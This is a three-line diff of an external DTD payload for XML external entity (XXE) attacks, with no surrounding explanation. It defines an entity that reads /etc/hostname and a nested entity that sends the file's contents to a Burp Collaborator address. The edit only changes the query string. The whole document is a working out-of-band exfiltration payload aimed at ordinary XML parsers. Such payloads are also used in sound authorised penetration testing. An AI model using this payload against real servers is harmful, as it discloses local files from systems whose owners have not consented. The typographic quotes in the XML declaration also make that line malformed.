@@ -1,3 +1,3 @@
 <?xml version=”1.0″ encoding=”utf-8″ ?>
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://vponmjexi2nvm8ftswfzljm3cuil6a.burpcollaborator.net/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://vponmjexi2nvm8ftswfzljm3cuil6a.burpcollaborator.net/?%file;'>">
